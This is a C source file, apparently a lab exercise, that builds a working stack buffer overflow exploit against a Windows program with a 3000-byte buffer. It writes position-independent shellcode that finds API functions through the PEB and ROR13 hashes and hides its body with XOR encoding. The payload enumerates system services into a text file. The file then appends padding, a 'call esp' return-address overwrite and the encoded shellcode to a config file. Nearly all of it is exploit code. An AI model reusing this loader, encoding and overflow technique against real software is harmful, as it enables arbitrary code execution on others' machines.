#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <wchar.h>

#pragma region ShellCode

#define XOR_VAL 0x01010101
#define XOR_BYTE 0x11

#define ACTIVE_CODE_SZ 1637
#define XOR_CODE_SZ 75

#define Kernel32Dll_HASH 1848363543

// from kernel32
#define ExitProcess_HASH  1944246398
#define LoadLibrary_HASH  3960360590
#define FreeLibrary_HASH  1305073056
#define CreateFile_HASH   2080380837
#define WriteFile_HASH	  3893000479
#define CloseHandle_HASH  268277755
#define GetLastError_HASH 1977227622
#define LocalAlloc_HASH   1275238394
#define LocalFree_HASH    1555753718

// from advapi32
#define OpenSCManagerA_HASH		 3194409588
#define EnumServicesStatusA_HASH 1997515476
#define CloseServiceHandle_HASH  3719674204

#pragma region Prototypes

// get peb for listing loaded dlls
PPEB get_peb(void);

// hash for wchar
DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string);

// hash for char
DWORD __stdcall ror13_hash(const char *string);

// GetModuleHandle using ror_13 hash
HMODULE __stdcall find_module_by_hash(DWORD hash);

// find kernel32.dll module
HMODULE __stdcall find_kernel32(void);

// GetProcAddresss
FARPROC __stdcall find_function(HMODULE module, DWORD hash);

// usefull payload
void __stdcall shell_entry();

// function with xor-shellcode
// First it decrypts usefull payload of shellcode and then jumps to it
void __stdcall shell_code();

/////////// help functions

void __stdcall initError(FARPROC getLastError, int exit_code);

// end of shell code
void END_SHELLCODE(void);

#pragma endregion Prototypes

void __stdcall shell_code()
{
	char* p, *begin, xr = XOR_BYTE;
	int sz;

	__asm
	{
		mov ax, ACTIVE_CODE_SZ
		mov sz, eax
	}
	
	__asm
	{
		mov eax, ebp
		add eax, XOR_CODE_SZ

		// add these four bytes to fix start position for decryption
		// (gained by forcing values in debugger)
		add eax, 4	

		mov begin, eax
	}

	//decrypt shell code
	for (p = begin; p - begin < sz; p++)
		*p ^= xr;

	shell_entry();
}

void __stdcall shell_entry()
{
	// init
	HMODULE hKernel = find_kernel32();
	FARPROC exit = find_function(hKernel, ExitProcess_HASH);

	FARPROC createFile; 
	if (NULL == (createFile = find_function(hKernel, CreateFile_HASH)))
		exit(1);

	FARPROC writeFile;
	if (NULL == (writeFile = find_function(hKernel, WriteFile_HASH)))
		exit(2);

	FARPROC closeHandle;
	if (NULL == (closeHandle = find_function(hKernel, CloseHandle_HASH)))
		exit(3);

	char fileName[] = { 's','e','r','v','i','c','e','s','.','t','x','t', 0 };
	char dllName[] = { 'A','d','v','a','p','i','3','2','.','d','l','l', 0 };

	HANDLE hFile;
	if (INVALID_HANDLE_VALUE == (hFile = (HANDLE)createFile(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL)))
		exit(4);

	DWORD written;
	if (!writeFile(hFile, fileName, 4, &written, NULL))
		exit(5);

	closeHandle(hFile);

	// writing to file works
	// then load advapi32.dll

	FARPROC loadLibrary;
	if (NULL == (loadLibrary = find_function(hKernel, LoadLibrary_HASH)))
		exit(6);
	
	FARPROC freeLibrary;
	if (NULL == (freeLibrary = find_function(hKernel, FreeLibrary_HASH)))
		exit(7);

	HMODULE hAdvapi;
	if (NULL == (hAdvapi = (HMODULE)loadLibrary(dllName)))
		exit(8);

	// advapi is loaded
	// then import functions

	FARPROC openSCManager;
	if (NULL == (openSCManager = find_function(hAdvapi, OpenSCManagerA_HASH)))
		exit(9);

	FARPROC enumServicesStatus;
	if (NULL == (enumServicesStatus = find_function(hAdvapi, EnumServicesStatusA_HASH)))
		exit(10);

	FARPROC closeServiceHandle;
	if (NULL == (closeServiceHandle = find_function(hAdvapi, CloseServiceHandle_HASH)))
		exit(11);

	// left to import dynamic allocation functions
	// and GetLastError

	FARPROC getLastError;
	if (NULL == (getLastError = find_function(hKernel, GetLastError_HASH)))
		exit(12);

	FARPROC localAlloc;
	if (NULL == (localAlloc = find_function(hKernel, LocalAlloc_HASH)))
		exit(13);

	FARPROC localFree;
	if (NULL == (localFree = find_function(hKernel, LocalFree_HASH)))
		exit(14);

	LPCSTR pszBuf;

	if (NULL == (pszBuf = (LPCSTR)localAlloc(LMEM_FIXED, MAX_PATH * sizeof(CHAR))))
		exit(255);
	
	localFree(pszBuf);

	
	////////////////////////////-------------- main body

	// all functions are loaded
	// then perform main task

	SC_HANDLE h_SCM;
	ENUM_SERVICE_STATUSA struct_ServiceStatus;
	ENUM_SERVICE_STATUSA *lpServiceStatus = NULL;
	BOOL b_RetVal = FALSE;
	DWORD dw_BytesNeeded;
	DWORD dw_ServiceCount;
	DWORD dw_ResumeHandle = 0;
	DWORD dw_ServiceType;
	DWORD dw_ServiceState;

	h_SCM = (SC_HANDLE)openSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);

	if (h_SCM == NULL)
		goto cleanup;

	//We are interested every service
	dw_ServiceType = SERVICE_WIN32;

	// interested to know about services in all states
	dw_ServiceState = SERVICE_STATE_ALL;

	//Call EnumServicesStatus using the handle returned by OpenSCManager
	b_RetVal = enumServicesStatus(
		h_SCM,
		dw_ServiceType,
		dw_ServiceState,
		&struct_ServiceStatus,
		sizeof(struct_ServiceStatus),
		&dw_BytesNeeded,
		&dw_ServiceCount,
		&dw_ResumeHandle);

	DWORD dw_Error = getLastError();

	// Verify if EnumServicesStatus needs more memory space
	if ((b_RetVal == FALSE) || dw_Error == ERROR_MORE_DATA)
	{
		DWORD dw_Bytes = dw_BytesNeeded + sizeof(ENUM_SERVICE_STATUSA);
		
		lpServiceStatus = (ENUM_SERVICE_STATUSA*)
			localAlloc(LMEM_FIXED, sizeof(ENUM_SERVICE_STATUSA) * dw_Bytes);
		
		if (lpServiceStatus == NULL)
			goto cleanup;

		b_RetVal = enumServicesStatus(h_SCM,
			dw_ServiceType,
			dw_ServiceState,
			lpServiceStatus,
			dw_Bytes,
			&dw_BytesNeeded,
			&dw_ServiceCount,
			&dw_ResumeHandle);

		if (b_RetVal == FALSE)
			goto cleanup;
	}

	
	/////////////////////----------- write list of services to file

	if (INVALID_HANDLE_VALUE == (hFile = (HANDLE)createFile(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL)))
		goto cleanup;

	char* p;
	int n;
	char nl[] = { '\r', '\n', 0 };

	for (DWORD i = 0; i < dw_ServiceCount; i++)
	{
		// get length of string
		p = lpServiceStatus[i].lpDisplayName;
		while (*p)
			p++;

		n = p - lpServiceStatus[i].lpDisplayName;

		//writeFile(hFile, str, sizeof(str), &written, NULL);
		writeFile(hFile, lpServiceStatus[i].lpDisplayName, n, &written, NULL);
		writeFile(hFile, nl, 2, &written, NULL);
	}

	closeHandle(hFile);


cleanup:

	//Close the SC_HANLDE returned by OpenSCManager
	if (h_SCM)
		closeServiceHandle(h_SCM);

	// free buffer
	if (lpServiceStatus)
		localFree(lpServiceStatus);

	// cleanup and exit
	freeLibrary(hAdvapi);
	exit(0);
}

HMODULE __stdcall find_kernel32(void)
{
	return find_module_by_hash(Kernel32Dll_HASH);
}

HMODULE __stdcall find_module_by_hash(DWORD hash)
{
	PPEB peb = NULL;
	LDR_DATA_TABLE_ENTRY *module_ptr = NULL, *first_mod = NULL;
	PLIST_ENTRY pListEntry = NULL;

	peb = get_peb();

	pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
	module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
	first_mod = module_ptr;

	do 
	{
		if (module_ptr->FullDllName.Length != 0 &&
			unicode_ror13_hash((WCHAR *)module_ptr->FullDllName.Buffer) == hash)
		{
			return (HMODULE)module_ptr->Reserved2[0];
		}

		else
		{
			pListEntry = pListEntry->Flink;
			module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
		}

	} while (module_ptr && module_ptr != first_mod);   // because the list wraps,

	return INVALID_HANDLE_VALUE;
}

PPEB __declspec(naked) get_peb(void)
{
	__asm {
		mov eax, fs:[0x30]
		ret
	}
}

DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string)
{
	DWORD hash = 0;

	while (*unicode_string != 0)
	{
		DWORD val = (DWORD)*unicode_string++;
		hash = (hash >> 13) | (hash << 19); // ROR 13
		hash += val;
	}
	return hash;
}

DWORD __stdcall ror13_hash(const char *string)
{
	DWORD hash = 0;

	while (*string) {
		DWORD val = (DWORD)*string++;
		hash = (hash >> 13) | (hash << 19);  // ROR 13
		hash += val;
	}
	return hash;
}

FARPROC __stdcall find_function(HMODULE module, DWORD hash)
{
	IMAGE_DOS_HEADER *dos_header;
	IMAGE_NT_HEADERS *nt_headers;
	IMAGE_EXPORT_DIRECTORY *export_dir;
	DWORD *names, *funcs;
	WORD *nameords;
	unsigned i;

	dos_header = (IMAGE_DOS_HEADER *)module;
	nt_headers = (IMAGE_NT_HEADERS *)((char *)module + dos_header->e_lfanew);
	export_dir = (IMAGE_EXPORT_DIRECTORY *)((char *)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	names = (DWORD *)((char *)module + export_dir->AddressOfNames);
	funcs = (DWORD *)((char *)module + export_dir->AddressOfFunctions);
	nameords = (WORD *)((char *)module + export_dir->AddressOfNameOrdinals);

	for (i = 0; i < export_dir->NumberOfNames; i++)
	{
		char *string = (char *)module + names[i];
		if (hash == ror13_hash(string))
		{
			WORD nameord = nameords[i];
			DWORD funcrva = funcs[nameord];
			return (FARPROC)((char *)module + funcrva);
		}
	}

	return NULL;
}

////////////

void __declspec(naked) END_SHELLCODE(void) {}

#pragma endregion ShellCode


//////////////

#define SHELLCODE_FILE		"Files\\shellcode.bin"
#define CONFIG_FILE			"Files\\config_23"
#define CONFIG_FILE_COPY	"Files\\config_23_copy"

// gets file size in bytes
unsigned getFileSize(char* path)
{
	FILE* f = fopen(path, "rb");
	fseek(f, 0, SEEK_END);
	long n = ftell(f);
	fclose(f);

	if (n > 0)
		return (unsigned)n;

	return 0;
}

// find byte that won't be found in the shell byte code
unsigned char find_xor_byte()
{
	for (int byte = 1; byte < 0xFF; byte++)
	{
		BOOL found = FALSE;

		for (char* c = (char*)shell_code + XOR_CODE_SZ; c < (char*)END_SHELLCODE; c++)
		{
			if (*c == byte)
			{
				found = TRUE;
				break;
			}
		}

		// is not found -> can use xor
		if (!found)
			return (unsigned char)byte;
	}

	return 0;
}

// write shellcode as payload into conf file
BOOL sc_write_conf(char *path, char* path_to)
{
	HANDLE hfile;
	unsigned int size, readed, written;

	// get call esp addr reversed
	char callEspAddrRev[] = "\x62\x50\x12\x97";
	_strrev(callEspAddrRev);

	// load shellcode from bin file to buffer
	hfile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		printf("Error, can't open shellcode!\n");
		return FALSE;
	}

	size = GetFileSize(hfile, NULL);
	if (!size) {
		printf("Error, file is empty\n");
		return FALSE;
	}

	char *pbuf = (char *)malloc(size);
	if (!ReadFile(hfile, pbuf, size, (LPDWORD)&readed, NULL)) {
		printf("Error, can't read shellcode data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	CloseHandle(hfile);
	hfile = NULL;

	// write shellcode to file as a payload
	hfile = CreateFileA(path_to, FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		printf("Error, can't open config file!\n");
		return FALSE;
	}

	// write 3000 + 4 + 4 + 4 'H' bytes (append after /start), 3000 - max buf size of vulnerable program
	char tmp[3000 + sizeof(int) + sizeof(int) + sizeof(int)];
	memset(tmp, 'H', sizeof(tmp));
	if (!WriteFile(hfile, tmp, sizeof(tmp), (LPDWORD)&written, NULL)) {
		printf("Error, can't write trash data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	// overwrite return address by call esp address
	if (!WriteFile(hfile, callEspAddrRev, sizeof(unsigned), (LPDWORD)&written, NULL)) {
		printf("Error, can't write callespaddr data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	// write config
	if (!WriteFile(hfile, pbuf, size, (LPDWORD)&written, NULL)) {
		printf("Error, can't write shellcode data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	free(pbuf);
	CloseHandle(hfile);
	return TRUE;
}

// write shell code to bin file 
BOOL sc_write_bin(char *path)
{
	int full_code_size = (int)END_SHELLCODE - (int)shell_code;
	int xor_code_size = 0, active_code_size = 0;

	// copy future shell code to buffer
	char* buf = (char*)malloc(full_code_size * sizeof(char));
	memcpy(buf, shell_code, full_code_size);

	// find first ret -> end of shell_code
	char* pf = (char*)shell_code;
	while (*pf != (char)0xC3)
	{
		//printf("pf = 0x%x\n", (char)*pf);
		xor_code_size++;
		pf++; 
	}
	
	/*
	encrypt start here:

	004010CA E8 11 00 00 00       call        004010E0  
	004010CF 8B E5                mov         esp,ebp  
	004010D1 5D                   pop         ebp  
	004010D2 C3                   ret  

	substract last bytes -> get xor_code_size

	*/
	xor_code_size -= 8;
	active_code_size = full_code_size - xor_code_size;

	if (xor_code_size != XOR_CODE_SZ || active_code_size != ACTIVE_CODE_SZ)
	{
		printf("Need to update constant XOR_CODE_SZ to %d\n", xor_code_size);
		printf("Need to update constant ACTIVE_CODE_SZ to %d\n", active_code_size);
		return FALSE;
	}

	unsigned char xr = find_xor_byte();
	if (xr != XOR_BYTE)
	{
		if (xr == 0)
			printf("Fatal: no suitable value for XOR_BYTE\n");
		else
			printf("Need to update XOR_BYTE constant to 0x%x\n", xr);
		return FALSE;
	}

	// encrypt active code part
	char* begin = (char*)(buf + xor_code_size);
	for (char* p = begin; p - begin < active_code_size; p++)
		*p ^= XOR_BYTE;

	// write shellcode
	FILE *output_file = fopen(path, "wb");

	if (!output_file)
	{
		free(buf);
		return FALSE;
	}

	fwrite(buf, full_code_size, sizeof(char), output_file);
	fclose(output_file);
	free(buf);
	return TRUE;
}

int main(int argc, char *argv[])
{
	// clear config file
	CopyFile(CONFIG_FILE_COPY, CONFIG_FILE, FALSE);

	// write shell code to bin file
	if (!sc_write_bin(SHELLCODE_FILE))
	{
		printf("Unable to write shell to binary file. Exitting\n");
		getchar();
		return 1;
	}

	// write shell code from bin to conf file
	if (!sc_write_conf(SHELLCODE_FILE, CONFIG_FILE))
	{
		printf("Unable to write shell to config file. Exitting\n");
		getchar();
		return 1;
	}

	printf("Success. Enter any key to exit\n");

	if (getchar())
		return 0;

	// for compilation
	shell_code();

	return 0;
}


/*

DWORD countServices()
{
SC_HANDLE h_SCM;
ENUM_SERVICE_STATUSA struct_ServiceStatus;
ENUM_SERVICE_STATUSA *lpServiceStatus;
BOOL b_RetVal = FALSE;
DWORD dw_BytesNeeded;
DWORD dw_ServiceCount;
DWORD dw_ResumeHandle = 0;
DWORD dw_ServiceType;
DWORD dw_ServiceState;


h_SCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);

if (h_SCM == NULL)
{
printf("Open service control manager failed : %d\n", GetLastError());
return 0;
}

//We are interested every service
dw_ServiceType = SERVICE_WIN32;

// interested to know about services in all states
dw_ServiceState = SERVICE_STATE_ALL;

//Call EnumServicesStatus using the handle returned by OpenSCManager
b_RetVal = EnumServicesStatusA(
h_SCM,
dw_ServiceType,
dw_ServiceState,
&struct_ServiceStatus,
sizeof(struct_ServiceStatus),
&dw_BytesNeeded,
&dw_ServiceCount,
&dw_ResumeHandle);

DWORD dw_Error = GetLastError();

// Verify if EnumServicesStatus needs more memory space
if ((b_RetVal == FALSE) || dw_Error == ERROR_MORE_DATA)
{
DWORD dw_Bytes = dw_BytesNeeded + sizeof(ENUM_SERVICE_STATUSA);
lpServiceStatus = new ENUM_SERVICE_STATUSA[dw_Bytes];
b_RetVal = EnumServicesStatusA(h_SCM,
dw_ServiceType,
dw_ServiceState,
lpServiceStatus,
dw_Bytes,
&dw_BytesNeeded,
&dw_ServiceCount,
&dw_ResumeHandle);

if (b_RetVal == FALSE)
{
CloseServiceHandle(h_SCM);
printf("EnumerateServiceStatus failed : %d\n", GetLastError());
return 0;
}
}

//for (DWORD i = 0; i< dw_ServiceCount; i++)
//{
//	printf("%s\n", lpServiceStatus[i].lpDisplayName);
//}

//Close the SC_HANLDE returned by OpenSCManager
CloseServiceHandle(h_SCM);

return dw_ServiceCount;
}



*/